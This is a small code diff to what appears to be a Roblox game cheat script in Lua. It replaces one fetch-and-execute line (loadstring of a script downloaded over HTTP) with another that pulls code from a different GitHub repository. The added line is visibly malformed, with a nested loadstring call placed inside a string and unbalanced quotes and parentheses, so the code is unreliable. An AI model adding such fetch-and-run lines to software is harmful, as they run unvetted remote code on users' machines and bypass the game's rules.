@@ -54,7 +54,7 @@ function CheckSea(e)
 end
 w = task.wait
 t = task
-local g = loadstring(game:HttpGet "https://raw.githubusercontent.com/ic3w0lf22/Roblox-Account-Manager/master/RAMAccount.lua")(
+local g = loadstring(game:HttpGet "loadstring(game:HttpGet("https://raw.githubusercontent.com/nhanhackerlord/ymfmain/main/main")(
 
 )
 TempleOfTimeCFrame =
